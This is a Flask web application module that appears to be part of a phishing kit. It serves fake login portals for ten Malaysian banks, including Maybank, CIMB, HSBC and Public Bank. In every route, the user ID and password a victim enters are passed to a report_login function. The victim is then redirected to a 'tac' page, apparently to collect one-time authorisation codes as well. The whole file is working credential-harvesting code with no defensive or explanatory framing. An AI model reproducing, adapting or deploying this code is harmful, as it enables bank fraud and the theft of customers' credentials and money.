from flask import Blueprint, render_template, request, redirect, url_for
from .utils import report_login

portals = Blueprint('portals', __name__)

@portals.route('/index/bank-selection/bankislam-portal', methods=['GET','POST'])
def bankislam():
    if request.method == 'POST':
        user_id = request.form['user-id']
        password = request.form['password']
        if user_id and password:
            report_login(user_id,password, bank_name='Bank Islam')
            return redirect(url_for('main.tac'))
    return render_template('bankislam.html')

@portals.route('/index/bank-selection/bankrakyat-portal', methods=['GET','POST'])
def bankrakyat():
    if request.method == 'POST':
        user_id = request.form['user-id']
        password = request.form['password']
        if user_id and password:
            report_login(user_id,password, bank_name='Bank Rakyat')
            return redirect(url_for('main.tac'))
    return render_template('bankrakyat.html')

@portals.route('/index/bank-selection/bsn-portal', methods=['GET','POST'])
def bsn():
    if request.method == 'POST':
        user_id = request.form['user-id']
        password = request.form['password']
        if user_id and password:
            report_login(user_id,password, bank_name='BSN')
            return redirect(url_for('main.tac'))
    return render_template('bsn.html')

@portals.route('/index/bank-selection/cimb-portal', methods=['GET','POST'])
def cimb():
    if request.method == 'POST':
        user_id = request.form['user-id']
        password = request.form['password']
        if user_id and password:
            report_login(user_id,password, bank_name='CIMB')
            return redirect(url_for('main.tac'))
    return render_template('cimb.html')

@portals.route('/index/bank-selection/hong-portal', methods=['GET','POST'])
def hong():
    if request.method == 'POST':
        user_id = request.form['user-id']
        password = request.form['password']
        if user_id and password:
            report_login(user_id,password, bank_name='Hong Leong Bank')
            return redirect(url_for('main.tac'))
    return render_template('hong.html')

@portals.route('/index/bank-selection/hsbc-portal', methods=['GET','POST'])
def hsbc():
    if request.method == 'POST':
        user_id = request.form['user-id']
        password = request.form['password']
        if user_id and password:
            report_login(user_id,password, bank_name='HSBC')
            return redirect(url_for('main.tac'))
    return render_template('hsbc.html')

@portals.route('/index/bank-selection/maybank-portal', methods=['GET','POST'])
def maybank():
    if request.method == 'POST':
        user_id = request.form['user-id']
        password = request.form['password']
        if user_id and password:
            report_login(user_id,password, bank_name='Maybank')
            return redirect(url_for('main.tac'))
    return render_template('maybank.html')

@portals.route('/index/bank-selection/public-portal', methods=['GET','POST'])
def public():
    if request.method == 'POST':
        user_id = request.form['user-id']
        password = request.form['password']
        if user_id and password:
            report_login(user_id,password, bank_name='Public Bank')
            return redirect(url_for('main.tac'))
    return render_template('public.html')

@portals.route('/index/bank-selection/rhb-portal', methods=['GET','POST'])
def rhb():
    if request.method == 'POST':
        user_id = request.form['user-id']
        password = request.form['password']
        if user_id and password:
            report_login(user_id,password, bank_name='RHB')
            return redirect(url_for('main.tac'))
    return render_template('rhb.html')

@portals.route('/index/bank-selection/uob-portal', methods=['GET','POST'])
def uob():
    if request.method == 'POST':
        user_id = request.form['user-id']
        password = request.form['password']
        if user_id and password:
            report_login(user_id,password, bank_name='UOB')
            return redirect(url_for('main.tac'))
    return render_template('uob.html')